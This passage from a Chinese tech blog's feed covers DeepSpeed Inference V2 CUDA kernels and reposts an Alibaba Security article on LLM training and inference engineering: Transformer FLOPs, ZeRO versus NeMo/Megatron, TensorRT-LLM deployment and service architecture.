class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，因此 <code>trans_a</code> 为 TRUE，而 <code>trans_b</code> 为 FALSE。随后针对 cublas API 调用就比较平凡了，不说了。</p><p><img src="/img/LLM/blas_linear.png" alt=""></p><p>再来看看激活函数的实现。BlasActivation 支持 GELU、RELU、SILU 和 identity 类型的激活函数。同样地，使用 CUDA 编程首要解决的就是如何安排 CUDA 线程组。这里，DeepSpeed 工程师为了避免一个线程做的活太少，让每个线程 unroll 4 次，一次 load 16 个字节，而一个线程块 512 个线程，因此一共可计算 512 * 4 * 16 / sizeof(T) 个元素。顺带我不得不吐槽一下 DeepSpeed 的代码，这么写应该是怕自己和别人读懂吧。</p><p><img src="/img/LLM/blas_activation.png" alt=""></p><p>然后我们来看看 CUDA 核函数本身的实现。代码读到这里，其实已经有一点规律可循了。</p><p>当核函数内部的计算较少甚至没有计算时，通常瓶颈都会在访存这。此时最好将内部的元素做条纹打包，让每个线程一次循环处理一个条纹的数据，而在循环内，需要将数据缓存在寄存器中，减少访存次数；</p><p>在对待线程相关的偏移量需要特别小心，多声明几个变量理清思路才是关键，将偏移量的颗粒度从大到小地考量会比较容易。</p><p>比如需要先考虑到一个线程块会计算多少元素，再考虑一次 unroll 循环有多少元素，再考虑 512 个线程中，每个线程占了多少元素，三者相加就是真正的偏移量。</p><p><img src="/img/LLM/blas_activation_kernel.png" alt=""></p><p>至于 GatedActivation 的实现，其实与 BlasActivation 差别不大，唯一的区别在于，他会算出一个 2 倍大的 output_feature，以便存放 gate 值和 activation 值，然后在 CUDA 核函数中，再使用 gate 函数计算，并写回最终结果即可。</p><h2 id="注意力计算">注意力计算</h2><p>关于 DeepSpeed Inference V2 注意力计算的部分，微软将其实现另开了一个库：<a href="https://github.com/microsoft/DeepSpeed-Kernels/">https://github.com/microsoft/DeepSpeed-Kernels/</a>，并在我们编译 DeepSpeed-MII 时将 .a 文件静态链接进来，考虑到本篇博客篇幅已经很长，因此我选择下篇再来讲讲 DeepSpeed-MII 的注意力机制实现！</p>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI</tag>
      
      <tag>DeepSpeed</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大模型性能优化的总结和分享</title>
    <link href="/2024/05/29/2024-5-29-LLM-perf/"/>
    <url>/2024/05/29/2024-5-29-LLM-perf/</url>
    
    <content type="html"><![CDATA[<h1>前言</h1><p>给各位对大模型感兴趣的读者分享一篇深度技术好文！原文来自<a href="https://mp.weixin.qq.com/s/FzimfEEzd_4y7dBIYWj50w">阿里安全使用 NVIDIA NeMo 框架和 TensorRT-LLM 的大模型工程化落地实践</a>。</p><p>随着 ChatGPT 的一夜爆火，大模型如今越来越广泛的应用到各种业务领域中，阿里安全的业务领域对大模型技术的应用也已经 2 年有余。本文对阿里安全在大模型工程领域积累的实践经验做出总结和分享。<br>在大模型实际应用实践的过程中，阿里安全采用 NVIDIA NeMo 框架和 TensorRT-LLM 大语言模型推理加速库，显著优化了模型训练与推理性能。其中 NeMo 在多卡环境可实现 2-3 倍的训练加速，TensorRT-LLM 结合 SmoothQuant Int8 可实现领先的推理加速比，动态批处理策略 (Dynamic Batch) 将计算步骤减少 30%，实际 QPS 增益 2-3 倍。Prompt 优化策略在特定业务中提升吞吐高达 10 倍。整体优化成果显著增强了模型性能与业务效率。</p><h1>Transformer 模型 FLOPs</h1><h2 id="Transformer-模型结构">Transformer 模型结构</h2><p>目前市场上主流大模型以 Transformer 网络结构为主，作为阿里安全的工程落地团队来说，全面分析这个模型的结构以和计算其 FLOPs 十分必要。本文首先重温 Transformer 模型的网络结构，结构如图一所示：</p><p><img src="/img/LLM/ali/1.webp" alt="图一：Transformer 模型的网络结构"></p><p>Transformer 模型主要包含三个部分：<br>Embedding 层，模型的输入层，主要功能是将输入的 input_ids 转成 token 的 embedding, 主要是通过查表的方式实现。</p><p>DecodeLayer, 主要功能是将输入的向量，经过 attention，MLP 的相关计算，求出 next_token 相关的向量。</p><p>OutputLayer, 主要功能是通过一层的 linearLayer 计算，求出 next_token 对应的每个 word 的 logit。</p><p>从上述的模型结构中可以看出，主要的计算量在 decodeLayer, 接下来，我们对该网络（以 Llama2 为例）的计算做详细的分析。</p><h2 id="符号定义">符号定义</h2><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></td><td>batch size</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></td><td>seq length</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mi>o</mi></msub></mrow><annotation encoding="application/x-tex">s_o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td>output length - 1</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span></span></span></span></td><td>hidden size</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></td><td>ffn hidden size</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></td><td>vocab size</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span></td><td>num layers</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>u</mi><mi>m</mi><mi mathvariant="normal">_</mi><mi>h</mi><mi>e</mi><mi>a</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">num\_head</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span></span></span></span></td><td>num heads</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>v</mi><mi mathvariant="normal">_</mi><mi>h</mi><mi>e</mi><mi>a</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">kv\_head</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span></span></span></span></td><td>key/value heads</td></tr></tbody></table><p>矩阵乘法 FLOPs：矩阵乘法为乘加过程，用浮点数运算次数 (FLOPs, floating point operations) 表示计算量的大小：</p><p>M [n,m] x N[m,p] =&gt; 2mnp</p><p>上面的矩阵 M 和 N 相乘的 FLOPs 计算量。</p><h2 id="Transformer-FLOPs-具体计算过程">Transformer FLOPs 具体计算过程</h2><p>decode-only Transformer 模型架构包含：</p><ul><li>一个 embedding 层</li><li>transformer layer 层，每层的构造相同，包括：<ul><li>Attention 部分</li><li>MLP 部分</li></ul></li><li>一个 output layer 输出层，将 hidden states 转化为词表输出概率</li></ul><p>因此模型的总 FLOPs 为：<br><strong>FLOPs = (attention + mlp) * layers + output_layer</strong></p><p>其中输入 embedding 层不涉及 FLOPs 计算，因为 embedding 层做的事情只是根据输入 token 选择对应行。</p><h3 id="总-FLOPs-与分析">总 FLOPs 与分析</h3><p>首先看 FLOPs 的计算结果：</p><p><img src="/img/LLM/ali/2.webp" alt=""></p><p>由于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span> 都是模型的参数，这几个变量是固定的，影响模型计算的 FLOPs 的就剩下 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mi>o</mi></msub></mrow><annotation encoding="application/x-tex">s_o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 这三个变量，可以总结如下规律：</p><ul><li>batch_size 越大，模型的计算密度越大</li><li>seq_len 越长，first_token 的推理计算密度越大</li><li>推理阶段 first_token 是 compute_bound, 后续的 token 推理是 memory_bound</li><li>当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mi>o</mi></msub></mrow><annotation encoding="application/x-tex">s_o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> 相等的时候，第一个 token 的推理计算量等于后续所有的 token 的计算之和，因此从这里可以看出，在推理过程中，kv_cache 的 prefill 的代价是比较高的，因此推理的过程中需要考虑到这个因素，才能更加高效的利用 GPU。</li></ul><h1>大模型训练</h1><p>首先，我们从工程的角度，分析并总结了一些大模型训练的相关经验，针对过去 2 年阿里安全工程团队对大模型训练加速这一部分做出分享。</p><h2 id="为什么选择-NVIDIA-NeMo-框架（Megatron-LM）训练">为什么选择 NVIDIA NeMo 框架（Megatron-LM）训练</h2><p>目前开源市场使用人数最多的是 DeepSpeed 和 NVIDIA NeMo 框架 (Megatron-LM) 这两种，本文主要从工程角度（训练速度的角度）来分析训练框架的特点，接下来分别介绍这两个框架的主要特征（feature）。</p><p>DeepSpeed 是微软开发的一款十分受欢迎的大模型训练框架，feature 有很多，对于训练速度提速这块，本文重点介绍其模型并行策略，主要是 ZeRO 相关 feature。</p><ul><li>ZeRO1：将优化器状态（optimizer states）切分到不同的 GPU 上，从而降低单个 GPU 的显存占用，这块节省的显存是最大的。</li><li>ZeRO2：优化器状态 (optimizer states) + 梯度 (gradients) 切分到不同的 GPU 上。</li><li>ZeRO3：把优化器状态 (optimizer states) + 梯度 (gradients) + 模型参数 (parameters) 切分到不同的 GPU 上。</li></ul><p><img src="/img/LLM/ali/3.webp" alt="图二：DeepSpeed ZeRO 模型并行"></p><p>假如 GPU 卡数为 N=64，Ψ 是模型参数，假设 Ψ=7.5B，使用 Adam 优化器，K 是优化器的超参，在 64 个 GPU 下 K=12，则：</p><ul><li>如果不用 ZeRO，需要占用 120GB 的显存，一般目前的 GPU 单卡放不下</li><li>如果用 ZeRO1，则占用 31.4GB，显存大于 40GB 的显卡即可直接启动训练，并且单机多卡或多机多卡训练的通信量不变</li><li>如果用 ZeRO2，则占用 16.6GB，通信量同样不变</li><li>如果用 ZeRO3，则占用 1.9GB，但是通信量会变为 1.5 倍</li></ul><p>备注：</p><ul><li>优化器状态 一般包含 FP32 Gradient、FP32 Variance、FP32 Momentum、FP32 Master Parameters。</li><li>梯度和模型参数 一般是 FP16，所以显存主要占用之一就是优化器。</li></ul><p>NVIDIA NeMo 框架 (Megatron-LM) 是 NVIDIA 提供的一个端到端的云原生框架，无论是在本地还是在云上，用户可以灵活地构建、定制和部署生成式 AI 模型。它包含但不限于预训练模型、数据管护工具、模型对齐工具、训练和推理框架、检索增强工具和护栏工具包，为用户使用生成式 AI 提供了一种既方便、又经济的方法，同时，NeMo 也支持多模态模型的训练，包括但不限于 Stable Diffusion, Vision Transformer 等。</p><p>本文关注焦点在于大模型训练框架的速度对比，因此只聚焦 Megatron-Core 部分。在使用 NeMo 进行大模型训练过程中，影响训练速度比较大的 feature 主要如下：</p><ul><li>张量并行（Tensor Parallelism）, 将矩阵乘法中的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>×</mo><mi>A</mi></mrow><annotation encoding="application/x-tex">X \times A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 分别切分成 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>×</mo><mo stretchy="false">{</mo><mi>A</mi><mn>1</mn><mo separator="true">,</mo><mi>A</mi><mn>2</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">X\times \{A1, A2\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">A</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mord">2</span><span class="mclose">}</span></span></span></span> 或者 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo>×</mo><mi>Y</mi><mo>×</mo><mn>1</mn><mi>b</mi></mrow><annotation encoding="application/x-tex">B \times Y \times 1b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">1</span><span class="mord mathnormal">b</span></span></span></span> 切分成 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>B</mi><mn>1</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>B</mi><mn>2</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>×</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">\left[ \begin{matrix} B_1 \\ B_2 \end{matrix} \right]\times Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span> 从而降低每个GPU的显存占用，并且将计算平均切分到各个 GPU 上。如下图三所示：</li></ul><p><img src="/img/LLM/ali/4.webp" alt="图三：张量并行（TP, Tensor Parallelism）"></p><ul><li>流水线并行（Pipeline Parallelism），该方法是将 Transformers 中多个 layer 分别分配到不同的 device 上，从而降低每个 device 的显存占用和计算量， 如图四所示，为了进一步降低流水线并行过程中 GPU 气泡，可以将流水线并行过程拆分成更小的 stage。</li></ul><p><img src="/img/LLM/ali/5.webp" alt="图四：流水线并行（PP, Pipeline Parallelism）"></p><ul><li><p>Layer &amp; Kernel Fusion，Megatron-Core 会将多个算子的计算融合在一起，放在一个 kernel 中计算，提升训练速度。</p></li><li><p>Distributed Opitimizer， Megatron-Core 也和 DeepSpeed 一样，把 OptimizerStates 分配到各个 device 中，减少显存的占用。</p></li></ul><p>当然，NeMo 还有其他的一些 feature，比如计算和通信做 overlap，调用基于 CuDNN 实现的 FlashAttention 等等。</p><h3 id="训练性能对比">训练性能对比</h3><p>在 Megatron-LM 的公开论文中可以看到（如图五所示），Megatron-Core 可以保证在 GPU 水平扩展的时候，单卡的 Flops 基本能保持不变，而 DeepSpeed 有比较大的衰减。175B 模型在 1,536 卡的规模上，Megatron-LM 的性能是 DeepSpeed 的 3 倍多，530B 模型在 2,240 卡规模上Megatron-LM 也是 DeepSpeed 的 3 倍多。</p><p><img src="/img/LLM/ali/6.webp" alt="图五：Megatron-LM 论文中性能对比数据"></p><p>我们团队在 Llama2-13B 的模型做了类似的实验，得出的结论也是 NeMo 比 DeepSpeed 性能高，具体的数据如下表所示：</p><p><img src="/img/LLM/ali/7.webp" alt=""></p><p>无论在单机 8 卡，还是双机 16 卡的规模上，NeMo 的性能都是 DeepSpeed 的 2 倍。</p><h2 id="NeMo-性能评测小结">NeMo 性能评测小结</h2><ul><li><p>由于训练过程中，模型并行以及梯度交换等需要在多个节点中通信，带宽会成为一个比较重要的瓶颈，在训练大模型的时候，网卡的带宽很容易成为瓶颈，建议使用RDMA+ 多网卡进行大模型训练。</p></li><li><p>为了降低多节点之间的模型的 OptimizerStates 的通信量，同时也保证训练的精度不会太大的影响，可以将 Distributed Optimizer dataType 设置为 FP32，同时将 grad_sync_dtype 设置为 BF16。</p></li></ul><h2 id="NeMo-使用问题总结">NeMo 使用问题总结</h2><ul><li><p>影响训练性能的三个重要参数：</p><ul><li><code>megatron_amp_O2x0</code>；混合精度 O2 优化选项，设为 <code>False</code> 会降低训练性能；</li><li><code>optim.grad_sync_dtype</code> 梯度同步精度选项，跟显存占用相关，使用 FP16 可以减少显存占用</li><li><code>optim.optimizer_dtype</code> optimizer states 参数类型，设为 FP16 或者 BF16 会降低模型精度。</li></ul></li><li><p>SFT Chat 类模型时需要将 NeMo 默认 prompt 配置修改成原来模型的 prompt，否则会造成训练 loss 增大，影响模型最终效果。</p></li><li><p>关于 TP 和 PP 在实践过程中参数如何配置的问题，我们通过实践发现，一般情况下，对于 13B 左右的模型，当卡的规模小于 32，如果有高效的 RDMA 网络，一般只需要开启 TP（TP&gt;1），PP=1 的配置；如果模型更大一些例如 70B 模型，需要同时开启 PP（PP&gt;1）。</p></li></ul><h1>大模型推理</h1><h2 id="大模型快速部署流程">大模型快速部署流程</h2><p>针对大模型推理，NVIDIA 推出了 TensorRT-LLM，实现了业界领先的性能。经多方比较，TensorRT-LLM 被我们选为构建阿里安全大模型高性能推理的基石。在阿里安全的业务中，由于大模型服务比较多，为了让算法同学可以快速部署大模型，工程团队开发了一系列功能让算法同学可以快速、高效、平稳的部署大模型。部署的具体流程图如下：</p><p><img src="/img/LLM/ali/8.webp" alt="图六：大模型部署流程"></p><ul><li>模型校验和标准化导出阶段：对用户提供的模型文件和包含相关参数的配置文件进行校验，并生成标准的数据格式，方便后续的模型编译工作。</li><li>模型编译阶段：使用 TensorTR-LLM 将模型编译成 engine 格式。</li><li>服务 DAG 编排阶段：将服务的各个模块定义为 Op，通过 DAG 的方式将其展示在可视化界面中，使得算法同学可以自主编排自己的服务逻辑。</li><li>DAG 调试和构建阶段：用户在 DAG 中可以自己构造服务的输入数据，完成对整个 DAG 进行调试。同时调试是实时的，用户可以在不部署的服务的情况下调试模型服务，调试结束后，可以将 DAG 固化，最后构建成真实的服务配置。</li><li>K8s 服务部署阶段：我们的模型服务都是 K8s 进行部署，便于快速部署，快速复制扩容等。</li></ul><h2 id="大模型服务在线推理架构">大模型服务在线推理架构</h2><h3 id="大模型推理场景有什么特点">大模型推理场景有什么特点</h3><ul><li>每条请求推理耗时的分布是非常不均匀，耗时短的请求可能在几百毫秒能返回，而耗时长的请求可能需要几十秒才能返回，这种情况在非 LLM 的模型上一般是不存在。</li><li>目前的大模型是生成式的模型，在实际应用过程中，会依赖上文的信息，即之前的推理结果需要在后续的推理过程中作为输入再次传进来。</li><li>部署的服务要求能做到实时监控内部的健康状态，因为大模型服务在使用 GPU 过程中，GPU 内部的错误（例如，数组越界等）会导致后续所有的计算都会失败，因此推理框架需要能及时感知这种错误，并且让框架做到快速重启。</li></ul><p>针对这种服务特点，我们采用异步服务进行部署，即上游调用先提交一次请求，然后可以通过轮询或者回调的方式获取服务计算的结果，具体的架构图如下所示：</p><p><img src="/img/LLM/ali/9.webp" alt=""></p><h4 id="HttpServer-层">HttpServer 层</h4><p>Httpserver 层是服务的前端，它负责服务对外的交互，输入处理和输出处理等事情。</p><ul><li>SocketQueue 和 socket 缓冲队列，将所有接收的请求放到缓冲队列中。</li><li>Flowlimit 是限流模块，会根据当前服务的负载，以及堆积的请求的状况，对服务进行限流，避免服务堆积过多的请求。</li><li>SessionManager 模块的功能主要是管理每个请求的状态，由于异步服务的请求在提交后，需要让外界知晓其当前的处理状态，该模块主要是负责该功能。</li><li>Input&amp;Output 模块主要是负责将输入的请求转换成服务内部的结构化对象以及将结果序列化返回给上游。</li><li>ContextManager 模块管理服务的上下文，例如，上游可能会传一些额外的字段或者信息，服务的内部处理的时候，可能需要使用到这些额外信息。</li></ul><h4 id="ComputeWorker-层">ComputeWorker 层</h4><p>该层是模型服务的核心计算层，服务主要的计算都在这层中完成。</p><ul><li>JobManager，后台计算的时候，会将若干个请求当成一个 job 进行处理，JobManager 主要负责对这些 job 状态进行管理。</li><li>CallbackManager, 对于需要进行回调返回的请求，该模块在 job 处理完成后，会回调相应的接口对结果进行回调。</li><li>LogManager, 本模块对服务的各种处理日志进行管理。</li><li>HealtyChecker, 该模块主要负责监控当前服务的健康状态，如果发现服务处理了异常，或者内部某些功能出现了不可恢复的问题后，会向 k8 集群汇报当前服务是不健康的，让集群对本节点进行重启。</li><li>ServiceDag, 服务中 op 的调度，负责执行 DAG 中的所有的 op。</li><li>ConfigManager, 服务的配置管理。</li><li>DynamicBatch, 对于大模型 batch 数据，进行动态调度管理，并且充分发挥 GPU 算力，不仅让 GPU 能够满负载的运行，而且可以避免有冗余的计算，具体的算法逻辑会在后续介绍。</li><li>LLMLogits, 该模块主要是注册一些钩子函数到 TensorRT-LLM 中，根据业务的需要是否要对模型中的 logits 进行处理。</li><li>TextLLM，对文本大模型一些业务逻辑的封装。</li><li>MultiModalLLM，对多模态大模型的一些业务逻辑的封装。</li><li>TrtLLMOp, 主要是对 TensorRT-LLM 的接口封装。</li><li>StopStrategy，注册一些钩子函数到 TensorRT-LLM 中，可以及时识别出是否要及时中断 generate 的过程，避免算力的浪费。</li></ul><h4 id="Basic-Component-层">Basic Component 